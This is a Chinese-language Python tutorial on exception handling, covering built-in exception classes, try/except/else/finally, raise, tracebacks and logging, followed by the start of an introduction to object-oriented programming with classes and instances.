IOError 输入/输出操作失败
OSError 操作系统错误
WindowsError  系统调用失败
ImportError 导入模块/对象失败
LookupError 无效数据查询的基类
IndexError  序列中没有此索引(index)
KeyError  映射中没有这个键
MemoryError 内存溢出错误(对于Python解释器不是致命的)
NameError 未声明/初始化对象(没有属性)
UnboundLocalError 访问未初始化的本地变量
ReferenceError  弱引用(Weak reference)试图访问已经垃圾回收了的对象
RuntimeError  一般的运行时错误
NotImplementedError 尚未实现的方法
SyntaxError 语法错误
IndentationError  缩进错误
TabError  Tab和空格混用
SystemError 一般的解释器系统错误
TypeError 对类型无效的操作
ValueError  传入无效的参数
UnicodeError  Unicode相关的错误
UnicodeDecodeError  Unicode解码时的错误
UnicodeEncodeError  Unicode编码时错误
UnicodeTranslateError Unicode转换时错误
Warning 警告的基类
DeprecationWarning  关于被弃用的特征的警告
FutureWarning 关于构造将来语义会有改变的警告
OverflowWarning 旧的关于自动提升为长整型(long)的警告
PendingDeprecationWarning 关于特性将会被废弃的警告
RuntimeWarning  可疑的运行时行为(runtime behavior)的警告
SyntaxWarning 可疑的语法的警告
UserWarning 用户代码生成的警告

【 自定义异常 】
Python的所有异常类的基类是BaseException,但如果用户要实现自定义异常,则不应该继承这个基类,而是应该直接或间接地继承Exception类。
BaseException的主要子类就是Exception,不管是系统的异常类,还是用户自定义的异常类,都应该从Exception派生

Python的错误其实也是class,所有的错误类型都继承自BaseException,Python所有的错误都是从BaseException类派生的,所以在使用except时需要注意的是,它不但捕获该类型的错误,还把其子类也一网打尽

在进行异常捕获时,不仅应该把Exception类对应的except块放在最后,而且所有父类异常的except块都应该排在子类异常的except块的后面,即:先处理小异常,再处理大异常

</pre>第二个except永远也捕获不到UnicodeError,因为UnicodeError是ValueError的子类,如果有,也被第一个except给捕获了<textarea>
try:
    foo()
except ValueError as e:
    print('ValueError')
except UnicodeError as e:
    print('UnicodeError')

</textarea><textarea>
class B(Exception):
    pass

class C(B):
    pass

class D(C):
    pass

for cls in [B, C, D]:
    try:
        raise cls()
    except D:
        print("D", end=" ")
    except C:
        print("C", end=" ")
    except B:
        print("B", end=" ")
# 输出: B C D

for cls in [B, C, D]:
    try:
        raise cls()
    except B:
        print("B", end=" ")
    except C:
        print("C", end=" ")
    except D:
        print("D", end=" ")
# 输出:B B B

</textarea><pre>
可以定义异常类,它可以执行任何其他类可以执行的任何操作,但通常保持简单,通常只提供许多属性,这些属性允许处理程序为异常提取有关错误的信息。在创建可能引发多个不同错误的模块时,通常的做法是为该模块定义的异常创建基类,并为不同错误条件创建特定异常类的子类
大多数异常都定义为名称以"Error"结尾,类似于标准异常的命名

</pre><textarea>
class Error(Exception):
    """Base class for exceptions in this module."""
    pass

class InputError(Error):
    """Exception raised for errors in the input.

    Attributes:
        expression -- input expression in which the error occurred
        message -- explanation of the error
    """

    def __init__(self, expression, message):
        self.expression = expression
        self.message = message

class TransitionError(Error):
    """Raised when an operation attempts a state transition that's not
    allowed.

    Attributes:
        previous -- state at beginning of transition
        next -- attempted new state
        message -- explanation of why the specific transition is not allowed
    """

    def __init__(self, previous, next, message):
        self.previous = previous
        self.next = next
        self.message = message

</textarea><pre>
【 调用栈 】
如果错误没有被捕获,它就会一直往上抛,最后被Python解释器捕获,打印一个错误信息,然后程序退出

</pre><textarea>
# err.py:
def foo(s):
    return 10 / int(s)

def bar(s):
    return foo(s) * 2

def main():
    bar('0')

main()

# 执行结果如下:
$ python3 err.py
Traceback (most recent call last):
  File "err.py", line 11, in < module>
    main()
  File "err.py", line 9, in main
    bar('0')
  File "err.py", line 6, in bar
    return foo(s) * 2
  File "err.py", line 3, in foo
    return 10 / int(s)
ZeroDivisionError: division by zero

解读错误信息是定位错误的关键,出错的时候一定要分析错误的调用栈信息才能定位错误的位置,从上往下可以看到整个错误的调用函数链:
错误信息第1行:Traceback (most recent call last):说明这是错误的跟踪信息。
第2~3行:
  File "err.py", line 11, in < module>
    main()
调用main()出错了,在代码文件err.py的第11行代码,但原因是第9行:
  File "err.py", line 9, in main
    bar('0')
调用bar('0')出错了,在代码文件err.py的第9行代码,但原因是第6行:
  File "err.py", line 6, in bar
    return foo(s) * 2
原因是return foo(s) * 2这个语句出错了,但这还不是最终原因,继续往下看:
  File "err.py", line 3, in foo
    return 10 / int(s)
原因是return 10 / int(s)这个语句出错了,这是错误产生的源头,因为下面打印了:
ZeroDivisionError: integer division or modulo by zero
根据错误类型ZeroDivisionError判断,int(s)本身并没有出错,但是int(s)返回0,在计算10 / 0时出错,至此找到错误源头。

</textarea><pre>
【 异常处理 】
异常处理机制己经成为衡量一门编程语言是否成熟的标准之一,使用异常处理机制的Python程序具有更好的容错性,更加健壮
异常机制可以使程序中的异常处理代码和正常业务代间分离,保证程序代码更加优雅,并可以提高程序的健壮性
python提供了两个非常重要的功能来处理python程序在运行中出现的异常和错误,可以使用该功能来调试python程序

Python的异常机制主要依赖try 、except 、else、finally和raise五个关键字:
1、try关键字后缩进的代码块简称try块,里面放置的是可能引发异常的代码
2、在except后对应的是异常类型和一个代码块,用于表明该except块处理这种类型的代码块
3、在多个except块之后可以放一个else块,表明程序不出现异常时还要执行else块
4、最后还可以跟一个finally块,finally块用于回收在try块里打开的物理资源,异常机制会保证finally块总被执行
5、raise用于引发一个实际的异常,raise可以单独作为语句使用,引发一个具体的异常对象

当一个程序发生异常时,代表该程序在执行时出现了非正常的情况,无法再执行下去。默认情况下,程序是要终止的。如果要避免程序退出,可以使用捕获异常的方式获取这个异常的名称,再通过其他的逻辑代码让程序继续运行,这种根据异常做出的逻辑处理叫作异常处理。

开发者可以使用异常处理全面地控制自己的程序。异常处理不仅仅能够管理正常的流程运行,还能够在程序出错时对程序进行必的处理。大大提高了程序的健壮性和人机交互的友好性。

捕捉异常可以使用try/except语句,Python内置了一套try...except...finally...的错误处理机制
try/except语句用来检测try语句块中的错误,从而让except语句捕获异常信息并处理。
如果不想在异常发生时结束程序,只需在try里捕获它。

try的工作原理:
当开始一个try语句后,python就在当前程序的上下文中作标记,这样当异常出现时就可以回到这里,try子句先执行,接下来会发生什么依赖于执行时是否出现异常。
如果当try后的语句执行时发生异常,python就跳回到try并执行第一个匹配该异常的except子句,异常处理完毕,控制流就通过整个try语句,除非在处理异常时又引发新的异常
如果在try后的语句里发生了异常,却没有匹配的except子句,异常将被递交到上层的try,或到程序的最上层,这样将结束程序,并打印缺省的出错信息
如果在try子句执行时没有发生异常,如果有else的话python将执行else语句后的语句,然后控制流通过整个try语句。

try except语句的执行流程如下:
1、首先执行try中的代码块,如果执行过程中出现异常,系统会自动生成一个异常对象,该异常对象会提交给Python解释器,此过程被称为引发异常。
2、当Python解释器收到异常对象时会寻找能处理该异常对象的except块,如果找到合适的except块则把该异常对象交给该except块处理,这个过程被称为捕获异常。如果Python解释器找不到捕获异常的except块则程序运行终止,Python解释器也将退出。

事实上,不管程序代码块是否处于try块中,甚至包括except块中的代码,只要执行该代码块时出现了异常,系统总会自动生成一个Error对象。如果程序没有为这段代码定义任何的except块,则Python解释器无法找到处理该异常的except块,程序就会停止运行;反之,如果程序发生异常,并且该异常经try捕获并由except处理完成,则程序会继续执行

在异常处理语法结构中,只有try块是必需的,也就是说:
如果没有try块,则不能有后面的except块和finally块;
except块和finally块都是可选的,但except块和finally块至少出现其中之一,也可以同时出现;
可以有多个except块,但捕获父类异常的except块应该位于捕获子类异常的except块的后面;
多个except块必须位于try块之后,finally块必须位于所有的except块之后。

finally语句块和else语句块的区别是,else语句块只有在没有异常发生的情况下才会执行,而finally语句则不管异常是否发生都会执行。不仅如此,无论是正常退出、异常退出,还是通过break、continue、return语句退出,finally语句块都会执行

所有的异常对象都包含了如下几个常用属性和方法:
args:该属性返回异常的错误编号和描述字符串。
errno:该属性返回异常的错误编号。
strerror:该属性返回异常的描述宇符串。
with_traceback():通过该方法可处理异常的传播轨迹信息。

</pre>简单的try....except...else的语法<textarea>
# try块仅有一个,但except代码块可以有多个,这是为了针对不同的异常类型提供不同的异常处理方式。当程序发生不同的意外情况时,会对应不同的异常类型,Python解释器就会根据该异常类型来决定使用哪个except块来处理该异常,最多会执行一个处理程序
# 通过在try块后提供多个except块可以无须在异常处理块中使用if判断异常类型,但依然可以针对不同的异常类型提供相应的处理逻辑,从而提供更细致、更有条理的异常处理逻辑

try:
    可能产生异常的代码块
except [(Error1, Error2, ...) [as e]]:  # 如果需要在except块中访问异常对象,可通过为except块单个异常类或异常类元组多异常捕获添加as e来实现,将异常类型赋值给变量e
    # 处理异常的代码块1
    # 访问异常的错误编号和详细信息
    print(e.args)
    # 访问异常的错误编号
    print(e.errno)
    # 访问异常的详细信息
    print(e.strerror)
except [(Error3, Error4, ...) [as e]]:  # except后面也可以不指定具体的异常名称,这样的话表示要捕获所有类型的异常
    处理异常的代码块2
else:
    没有异常发生时执行的代码块,当try块中发现异常则else块中的语句将不会被执行,放在else块中的代码所引发的异常不会被except块捕获
    如果希望某段代码的异常能被后面的except块捕获,那么就应该将这段代码放在try块的代码之后
    如果希望某段代码的异常能向外传播(不被 except 块捕获),那么就应该将这段代码放在else块中
finally:
    finally语句是与try和except语句配合使用的,其通常是用来定义必须在所有情况下执行的清理操作。无论try中的语句是否跳入except中,最终都要进入finally语句,并执行其中的代码块

</textarea><textarea>
# 可以不带任何异常类型使用except捕获所有发生的异常。但这不是一个很好的方式,不能通过该程序识别出具体的异常信息,因为它捕获所有的异常
try:
    print('try...')
    r = 10 / 0
    print('result:', r)
except:
    print('except')
else:
    print('ok')

# 最后的except子句可以省略异常名,以用作通配符。但请谨慎使用,因为以这种方式很容易掩盖真正的编程错误！它还可用于打印错误消息,然后重新引发异常(同样允许调用者处理异常)
import sys
try:
    f = open('myfile.txt')
    s = f.readline()
    i = int(s.strip())
except OSError as err:
    print("OS error: {0}".format(err))
except ValueError:
    print("Could not convert data to an integer.")
except:
    print("Unexpected error:", sys.exc_info()[0])
    raise

# 获取未知错误的信息
import sys
try:
    print(10 / 0)
except:
    print(sys.exc_info())
    # (< class 'ZeroDivisionError'>, ZeroDivisionError('division by zero',), < traceback object at 0x7f8f896dde48>)
except Exception as e:
    print(e)
    # division by zero

# except来捕获特定类型的错误
try:
    print('try...')
    r = 10 / 0
    print('result:', r)         # 不会被执行
except ZeroDivisionError as e:
    print('except:', e)
finally:
    print('finally...')
print('END')

# 多个except来捕获不同类型的错误
try:
    print('try...')
    r = 10 / int('2')
    print('result:', r)
except ValueError as e:             # int()函数可能会抛出ValueError,所以用一个except捕获ValueError
    print('ValueError:', e)
except ZeroDivisionError as e:      # 捕获ZeroDivisionError
    print('ZeroDivisionError:', e)
else:
    print('no error!')              # 当没有错误发生时会自动执行else语句
finally:
    print('finally...')
print('END')

</textarea>要求用户一个有效的整数,否则会一直提示输入,但允许用户中断程序,使用Control-C或操作系统支持的其他操作,用户引起的中断可以通过引发KeyboardInterrupt异常来指示<textarea>
while True:
    try:
        x = int(input("Please enter a number: "))
        break
    except ValueError:
        print("Oops!  That was no valid number.  Try again...")

'''
try 语句的工作原理:
首先执行try子句即try和except关键字之间的多行语句
如果没有异常发生则跳过except子句并完成tr 语句的执行。
如果在执行try子句时发生了异常则跳过该子句中剩下的部分。然后如果异常的类型和except关键字后面的异常匹配则执行except子句,然后继续执行try语句之后的代码。
如果发生的异常和except子句中指定的异常不匹配则将其传递到外部的try语句中,如果没有找到处理程序则它是一个未处理异常,执行将停止并显示如上所示的消息。
'''

</textarea><textarea>
try:
    a = int(input("输入被除数:"))
    b = int(input("输入除数:"))
    c = a / b
    print("您输入的两个数相除的结果是:", c )
except (ValueError, ArithmeticError):
    print("程序发生了数字格式异常、算术异常之一")
except :
    print("未知异常")
print("程序继续运行")

try:
    a = int(input("输入被除数:"))
    b = int(input("输入除数:"))
    c = a / b
    print("您输入的两个数相除的结果是:", c )
except ValueError:
    print("数值错误:程序只能接收整数参数")
except ArithmeticError:
    print("算术错误")
except Exception:
    print("未知异常")

</textarea><pre>
如果Python程序在执行try块、except块时遇到了return或raise语句,这两条语句都会导致该方法立即结束,那么系统执行这两条语句并不会结束该方法,而是去寻找该异常处理流程中的finally块,如果没有找到finally块,程序立即执行return或raise语句,方法中止;如果找到finally块,系统立即开始执行finally块,只有当finally块执行完成后,系统才会再次跳回来执行try块、except块里的return或raise语句;如果在finally块里也使用了return或raise等导致方法中止的语句,finally块己经中止了方法,系统将不会跳回去执行try块、except块里的任何代码。

</pre>return语句强制方法结束,但一定会先执行finally块的代码,除非在try块、except块中调用了退出Python解释器的方法,否则不管在try块、except块中执行怎样的代码,出现怎样的情况,异常处理的finally块总会被执行。调用sys.exit()方法退出程序不能阻止finally块的执行,这是因为sys.exit()方法本身就是通过引发SystemExit异常来退出程序的<textarea>
import os
def test():
    fis = None
    try:
        fis = open("a.txt")
    except OSError as e:
        print(e.strerror)
        return                # return语句强制方法返回
        #os._exit(1)          # 如果在异常处理代码中使用os.exit(1)语句来退出Python解释器,则finally块将失去执行的机会
    finally:
        if fis is not None:
            try:
                fis.close()   # 关闭磁盘文件,回收资源
            except OSError as ioe:
                print(ioe.strerror)
        print("执行finally块里的资源回收!")

test()

</textarea>在通常情况下,不要在finally块中使用如return或raise等导致方法中止的语句,一旦在finally块中使用了return或raise语句,将会导致try块、except块中的return、raise语句失效,因为要保证finally能够执行<textarea>
def test():
    try:
        return True   # 因为finally块中包含了return语句,所以这里的return语句失去作用
    finally:
        return False
a = test()
print(a)    # False

</textarea>打开一个文件,在该文件中的内容写入内容,但文件没有写入权限,发生了异常<textarea>
try:
    fh = open("testfile", "w")
    try:
        fh.write("这是一个测试文件,用于测试异常!!")
    finally:
        print("关闭文件")
        fh.close()
except IOError:
    print("Error: 没有找到文件或读取文件失败")
else:
    print("内容写入文件成功")
    fh.close()

$ python test.py
内容写入文件成功
$ cat testfile       # 查看写入的内容
这是一个测试文件,用于测试异常!!

# 去掉testfile文件的写权限
chmod -w testfile
# 再执行以上代码
$ python test.py
Error: 没有找到文件或读取文件失败

</textarea><pre>
异常处理程序不仅处理try子句中遇到的异常,还处理try子句中调用(即使是间接地)的函数内部发生的异常
用try...except捕获错误还有一个好处就是可以跨越多层调用,比如函数main()调用foo(),foo()调用bar(),结果bar()出错了,这时只要main()捕获到了就可以处理,也就是说,不需要在每个可能出错的地方去捕获错误,只要在合适的层次去捕获错误就可以了。这样一来,就大大减少了写try...except...finally的麻烦

</pre><textarea>
def foo(s):
    return 10 / int(s)

def bar(s):
    return foo(s) * 2

def main():
    try:
        bar('0')
    except Exception as e:
        print('Error:', e)
    finally:
        print('finally...')

main()

'''
Error: division by zero
finally...
'''

</textarea><pre>
try...except语句有一个可选的else子句,在使用时必须放在所有的except子句后面。对于在try子句不引发异常时必须执行的代码来说很有用
使用else子句比向try子句添加额外的代码要好,因为它避免了意外捕获由try...except语句保护的代码未引发的异常

</pre><textarea>
for arg in sys.argv[1:]:
    try:
        f = open(arg, 'r')
    except OSError:
        print('cannot open', arg)
    else:
        print(arg, 'has', len(f.readlines()), 'lines')
        f.close()

</textarea><pre>
发生异常时它可能具有关联值,也称为异常参数,参数的存在和类型取决于异常类型。
except子句可以在异常名称后面指定一个变量,这个变量和一个异常实例绑定,它的参数存储在instance.args中。为了方便起见,异常实例定义了__str__(),因此可以直接打印参数而无需引用.args 。也可以在抛出之前首先实例化异常,并根据需要向其添加任何属性
如果异常有参数则它们将作为未处理异常的消息的最后一部分('详细信息')打印

</pre><textarea>
try:
    raise Exception('spam', 'eggs')
except Exception as inst:
    print(type(inst))    # the exception instance
    print(inst.args)     # arguments stored in .args
    print(inst)          # __str__ allows args to be printed directly, but may be overridden in exception subclasses
    x, y = inst.args     # unpack args
    print('x =', x)
    print('y =', y)

< class 'Exception'>
('spam', 'eggs')
('spam', 'eggs')
x = spam
y = eggs

</textarea><pre>
【 使用raise语句强制触发指定的异常、抛出异常 】
错误是class,捕获一个错误就是捕获到该class的一个实例。因此错误并不是凭空产生的,而是有意创建并抛出的。Python的内置函数会抛出很多类型的错误,编写的函数也可抛出错误
只有在必要的时候才定义自己的错误类型,如果可以选择Python已有的内置的错误类型比如ValueError、TypeError,尽量使用Python内置的错误类型

如果要抛出自定义错误,首先根据需要可以定义一个错误的class,选择好继承关系,然后用raise语句抛出一个错误的实例

raise [exceptionName [(reason)]]
raise唯一的参数就是要抛出的异常。这个参数必须是一个异常实例或者是一个异常类(派生自Exception的类)。如果传递的是一个异常类,它将通过调用没有参数的构造函数来隐式实例化
其中用[]括起来的为可选参数,其作用是指定抛出的异常名称及异常信息的相关描述。如果可选参数全部省略则raise会把当前错误原样抛出;如果仅省略 (reason)则在抛出异常时将不附带任何的异常描述信息

raise语句有如下三种常用的用法:
1、raise:单独一个raise。该语句引发当前上下文中捕获的异常(比如在 except 块中),或默认引发RuntimeError异常。
2、raise 异常类名称:raise后带一个异常类名称。该语句引发指定异常类的默认实例。
3、raise 异常类名称(描述信息):在引发指定异常的同时,附带异常的描述信息。
上面三种用法最终都是要引发一个异常实例(即使指定的是异常类,实际上也是引发该类的默认实例),raise语句每次只能引发一个异常实例

</pre><textarea>
>>> raise
Traceback (most recent call last):
  File "< pyshell#1>", line 1, in < module>
    raise
RuntimeError: No active exception to reraise
>>> raise ZeroDivisionError
Traceback (most recent call last):
  File "< pyshell#0>", line 1, in < module>
    raise ZeroDivisionError
ZeroDivisionError
>>> raise ZeroDivisionError("除数不能为零")
Traceback (most recent call last):
  File "< pyshell#2>", line 1, in < module>
    raise ZeroDivisionError("除数不能为零")
ZeroDivisionError: 除数不能为零

</textarea><textarea>
# err_raise.py
class FooError(ValueError):
    pass

def foo(s):
    n = int(s)
    if n==0:
        raise FooError('invalid value: %s' % s)
    return 10 / n

foo('0')

# 执行,可以最后跟踪到自定义的错误:
$ python3 err_raise.py
Traceback (most recent call last):
  File "err_throw.py", line 11, in < module>
    foo('0')
  File "err_throw.py", line 8, in foo
    raise FooError('invalid value: %s' % s)
__main__.FooError: invalid value: 0

</textarea>以下为与RuntimeError相关的实例,实例中创建了一个类,基类为RuntimeError,用于在异常触发时输出更多的信息<textarea>
class Networkerror(RuntimeError):
    def __init__(self, arg):
        self.args = arg

# 在定义以上类后可以触发该异常
try:
    raise Networkerror("Bad hostname")
except Networkerror as e:
    print(e, e.args)

</textarea>为了能够捕获异常,"except"语句必须有用相同的异常来抛出类对象或字符串<textarea>
def mye( level ):
    if level < 1:
        raise Exception("Invalid level!")
        # 触发异常后,后面的代码就不会再执行
    elif level > 5:
        raise Exception("Invalid level!")
        # 触发异常后,后面的代码就不会再执行
try:
    mye(0)            # 触发异常
    mye(5)
except Exception as err:
    print(1,err)
else:
    print(2)

# 输出结果为:
$ python test.py
1 Invalid level!

</textarea><textarea>
# err_reraise.py

def foo(s):
    n = int(s)
    if n==0:
        raise ValueError('invalid value: %s' % s)
    return 10 / n

def bar():
    try:
        foo('0')
    except ValueError as e:
        print('ValueError!')
        raise                  # raise语句如果不带参数就会把当前错误原样抛出

bar()

# 输出:
ValueError!
Traceback (most recent call last):
  File "./hello.py", line 17, in < module>
    bar()
  File "./hello.py", line 12, in bar
    foo('0')
  File "./hello.py", line 7, in foo
    raise ValueError('invalid value: %s' % s)
ValueError: invalid value: 0

</textarea><pre>
上例打印一个ValueError!后,又把错误通过raise语句抛出去了
这种错误处理方式不但没病,而且相当常见。捕获错误目的只是记录一下,便于后续追踪。但是由于当前函数不知道应该怎么处理该错误,所以最恰当的方式是继续往上抛,让顶层调用者去处理

【 except和raise同时使用 】
在实际应用中对异常可能需要更复杂的处理方式,当一个异常出现时单靠某个方法无法完全处理该异常,必须由几个方法协作才可完全处理该异常,即在异常出现的当前方法中程序只对异常进行部分处理,还有些处理需要在该方法的调用者中才能完成,所以应该再次引发异常,让该方法的调用者也能捕获到异常。

为了实现这种通过多个方法协作处理同一个异常的情形,可以在except块中结合raise语句来完成

</pre><textarea>
class AuctionException(Exception): pass
class AuctionTest:
    def __init__(self, init_price):
        self.init_price = init_price
    def bid(self, bid_price):
        d = 0.0
        try:
            d = float(bid_price)
        except Exception as e:
            print("转换出异常:", e)  # 此处只是简单地打印异常信息

            raise AuctionException("竞拍价必须是数值,不能包含其他字符！")  # 再次引发自定义异常
            raise AuctionException(e)  # 用自定义异常对原始异常进行包装,把原始异常e包装成了AuctionException异常,这种方式也被称为异常包装或异常转译
        if self.init_price > d:
            raise AuctionException("竞拍价比起拍价低,不允许竞拍！")
        initPrice = d

def main():
    at = AuctionTest(20.4)
    try:
        at.bid("df")
    except AuctionException as ae:
        # 再次捕获到bid()方法中的异常,并对该异常进行处理
        print('main函数捕捉的异常:', ae)

main()

# except块捕获到异常后,系统打印了该异常的字符串信息,接着引发一个AuctionException异常,通知该方法的调用者再次处理该AuctionException异常。所以程序中的main()函数,也就是bid()方法的调用者还可以再次捕获AuctionException异常,井将该异常的详细描述信息打印出来。

</textarea><pre>
这种except和raise结合使用的情况在实际应用中非常常用。实际应用对异常的处理通常分成两个部分:
应用后台需要通过日志来记录异常发生的详细情况;
应用还需要根据异常向应用使用者传达某种提示;

在这种情形下所有异常都需要两个方法共同完成,也就必须将except和raise结合使用。

</pre>如果需要确定是否引发了异常但不打算处理它,则可以使用更简单的raise语句形式重新引发异常<textarea>
try:
    raise NameError('HiThere')
except NameError:
    print('An exception flew by!')
    raise

An exception flew by!
Traceback (most recent call last):
  File "< stdin>", line 2, in < module>
NameError: HiThere

</textarea><pre>
【 定义清理操作 】
try语句有另一个可选子句,用于定义必须在所有情况下执行的清理操作

</pre><textarea>
>>> try:
...     raise KeyboardInterrupt
... finally:
...     print('Goodbye, world!')
...
Goodbye, world!
KeyboardInterrupt
Traceback (most recent call last):
  File "< stdin>", line 2, in < module>

</textarea><pre>
finally子句总会在离开try语句前被执行,无论是否发生了异常。当在try子句中发生了异常且尚未被except子句处理或它发生在except或else子句中时,它将在finally子句执行后被重新抛出。当try语句的任何其他子句通过break,continue或return语句离开时finally也会在"离开之前"被执行

</pre><textarea>
>>> def divide(x, y):
...     try:
...         result = x / y
...     except ZeroDivisionError:
...         print("division by zero!")
...     else:
...         print("result is", result)
...     finally:
...         print("executing finally clause")
...
>>> divide(2, 1)
result is 2.0
executing finally clause
>>> divide(2, 0)
division by zero!
executing finally clause
>>> divide("2", "1")
executing finally clause
Traceback (most recent call last):
  File "< stdin>", line 1, in < module>
  File "< stdin>", line 3, in divide
TypeError: unsupported operand type(s) for /: 'str' and 'str'

</textarea><pre>
finally子句在任何情况下都会被执行。两个字符串相除所引发的TypeError不会由except子句处理,因此会在finally子句执行后被重新引发。

在实际应用程序中,finally子句对于释放外部资源(例如文件或者网络连接)非常有用,无论是否成功使用资源。

【 预定义的清理操作 】
某些对象定义了在不再需要该对象时要执行的标准清理操作,无论使用该对象的操作是成功还是失败

</pre><textarea>
# 尝试打开一个文件并把其内容打印到屏幕上
for line in open("myfile.txt"):
    print(line, end="")

# 这个代码的问题在于,它在这部分代码执行完后,会使文件在一段不确定的时间内处于打开状态。这在简单脚本中不是问题,但对于较大的应用程序来说可能是个问题。 with语句允许像文件这样的对象能够以一种确保它们得到及时和正确的清理的方式使用。:

with open("myfile.txt") as f:
    for line in f:
        print(line, end="")

# 执行完语句后,即使在处理行时遇到问题,文件f也始终会被关闭。和文件一样,提供预定义清理操作的对象将在其文档中指出这一点。

</textarea><pre>
【 sys.exc_info()方法:获取异常信息 】
在实际调试程序的过程中,有时只获得异常的类型是远远不够的,还需要借助更详细的异常信息才能解决问题。

捕获异常时有2种方式可获得更多的异常信息:
1、使用sys模块中的exc_info和last_traceback()方法
2、使用traceback模块中的相关函数

exc_info()方法会将当前的异常信息以元组的形式返回,该元组中包含3个元素,分别为type、value和traceback
type:异常类型的名称,它是BaseException的子类
value:捕获到的异常实例
traceback:是一个traceback对象,包含了更多的异常信息,包括文件名、抛出异常的代码所在的行数、抛出异常的具体代码

要查看traceback对象包含的内容,需要先引进traceback模块,然后调用traceback模块中的print_tb方法,并将sys.exc_info()输出的traceback对象作为参数参入

</pre><textarea>
import sys
import traceback
try:
    x = int(input("请输入一个被除数:"))
    print("30除以",x,"等于",30/x)
except:
    print(sys.exc_info())
    traceback.print_tb(sys.exc_info()[2])
    print("其他异常...")

# 输出:
请输入一个被除数:0
(< class 'ZeroDivisionError'>, ZeroDivisionError('division by zero',), < traceback object at 0x7f2bcb0e81c8>)
  File "./hello.py", line 8, in < module>
    print("30除以",x,"等于",30/x)
其他异常...

</textarea>除了使用sys.exc_info()方法获取更多的异常信息之外,还可以使用traceback模块,该模块可以用来查看异常的传播轨迹,追踪异常触发的源头<textarea>
import traceback

class SelfException(Exception): pass

def main():
    firstMethod()

def firstMethod():
    secondMethod()

def secondMethod():
    thirdMethod()

def thirdMethod():
    raise SelfException("自定义异常信息")

try:
    main()
except:
    # 捕捉异常,并将异常传播信息输出控制台
    traceback.print_exc()
    # 捕捉异常,并将异常传播信息输出指定文件中
    traceback.print_exc(file=open('log.txt', 'a'))

</textarea><pre>
【 logging模块记录错误 】
如果不捕获错误,自然可以让Python解释器来打印出错误堆栈,但程序也被结束了。既然能捕获错误就可以把错误堆栈打印出来,然后分析错误原因,同时让程序继续执行下去。

</pre>Python内置的logging模块可以非常容易地记录错误信息,通过配置logging还可以把错误记录到日志文件里,方便事后排查<textarea>
import logging

def foo(s):
    return 10 / int(s)

def bar(s):
    return foo(s) * 2

def main():
    try:
        bar('0')
    except Exception as e:
        logging.exception(e)

main()
print('END')

# 同样是出错,但程序打印完错误信息后会继续执行,并正常退出:
$ python3 err_logging.py
ERROR:root:division by zero
Traceback (most recent call last):
  File "err_logging.py", line 13, in main
    bar('0')
  File "err_logging.py", line 9, in bar
    return foo(s) * 2
  File "err_logging.py", line 6, in foo
    return 10 / int(s)
ZeroDivisionError: division by zero
END

</textarea>
</div>

<div id="oop">
<h3>Python面向对象 一切皆对象</h3><pre>
面向对象编程Object Oriented Programming简称OOP,是一种程序设计思想,是一种封装代码的方法。OOP把对象作为程序的基本单元,一个对象包含了数据和操作数据的函数。
将乱七八糟的数据扔进列表中,这就是一种简单的封装,是数据层面的封装;
把常用的代码块打包成一个函数,这也是一种封装,是语句层面的封装。
代码封装其实就是隐藏实现功能的具体代码,仅留给用户使用的接口,就好像使用计算机,用户只需要使用键盘、鼠标就可以实现一些功能,而根本不需要知道其内部是如何工作的。
面向对象编程也是一种封装的思想,不过显然比以上两种封装更先进,它可以更好地模拟真实世界里的事物(将其视为对象),并把描述特征的数据和代码块(函数)封装到一起

面向过程的程序设计把计算机程序视为一系列的命令集合,即一组函数的顺序执行。为了简化程序设计,面向过程把函数继续切分为子函数,即把大块函数通过切割成小块函数来降低系统的复杂度。
而面向对象的程序设计把计算机程序视为一组对象的集合,而每个对象都可以接收其他对象发过来的消息,并处理这些消息,计算机程序的执行就是一系列消息在各个对象之间传递。
在Python中所有数据类型都可以视为对象,当然也可以自定义对象, 自定义的对象数据类型就是面向对象中的类(Class)的概念

面向对象编程是在面向过程编程的基础上发展来的,它比面向过程编程具有更强的灵活性和扩展性

</pre>面向过程和面向对象在程序流程上的不同之处<textarea>
# 处理学生的成绩表,为了表示一个学生的成绩,面向过程的程序可以用一个dict表示:
std1 = { 'name': 'Michael', 'score': 98 }
std2 = { 'name': 'Bob', 'score': 81 }

# 而处理学生成绩可以通过函数实现,比如打印学生的成绩:
def print_score(std):
    print('%s: %s' % (std['name'], std['score']))

# 如果采用面向对象的程序设计思想,首先思考的不是程序的执行流程,而是Student这种数据类型应该被视为一个对象,这个对象拥有name和score这两个属性。如果要打印一个学生的成绩,首先必须创建出这个学生对应的对象,然后给对象发一个print_score消息,让对象自己把自己的数据打印出来。
class Student(object):

    def __init__(self, name, score):
        self.name = name
        self.score = score

    def print_score(self):
        print('%s: %s' % (self.name, self.score))

# 给对象发消息实际上就是调用对象对应的关联函数即对象的方法(Method)
bart = Student('Bart Simpson', 59)
lisa = Student('Lisa Simpson', 87)
bart.print_score()
lisa.print_score()

</textarea><pre>
Python从设计之初就已经是一门面向对象的语言,正因为如此,在Python中创建一个类和对象是很容易的
Python完全能以面向对象的方式编程,而且Python的面向对象比较简单,它不像其他面向对象语言提供了大量繁杂的面向对象特征,它致力于提供简单、够用的语法功能

面向对象的设计思想是从自然界中来的,因为在自然界中类(Class)和实例(Instance)的概念是很自然的。Class是一种抽象概念,比如定义的Class——Student是指学生这个概念,而实例(Instance)则是一个个具体的Student,比如Bart Simpson和Lisa Simpson是两个具体的Student。
所以面向对象的设计思想是抽象出Class,根据Class创建Instance。
面向对象的抽象程度又比函数要高,因为一个Class既包含数据又包含操作数据的方法

封装、继承和多态是面向对象的三大特点

面向对象最重要的概念就是类(Class)和实例(Instance),必须牢记类是抽象的模板比如Student类,而实例是根据类创建出来的一个个具体的对象,每个对象都拥有相同的方法,但各自的数据可能不同

【 类 】
类提供了一种组合数据和功能的方法。创建一个新类意味着创建一个新类型的对象,从而允许创建一个该类型的新实例。每个类的实例可以拥有保存自己状态的属性。一个类的实例也可以有改变自己状态的(定义在类中的)方法

Python的类提供了面向对象编程的所有标准特性:类继承机制允许多个基类,派生类可以覆盖它基类的任何方法,一个方法可以调用基类中相同名称的的方法。对象可以包含任意数量和类型的数据。和模块一样,类也拥有Python天然的动态特性:它们在运行时创建,可以在创建后修改

类(Class): 用来描述具有相同的属性和方法的对象的集合,它定义了该集合中每个对象所共有的属性和方法。对象是类的实例。
类变量:类变量在整个实例化的对象中是公用的。类变量定义在类中且在函数体之外。类变量通常不作为实例变量使用。
数据成员:类变量或者实例变量, 用于处理类及其实例对象的相关的数据。
方法重写:如果从父类继承的方法不能满足子类的需求,可以对其进行改写,这个过程叫方法的覆盖(override),也称为方法的重写。
局部变量:定义在方法中的变量,只作用于当前实例的类。
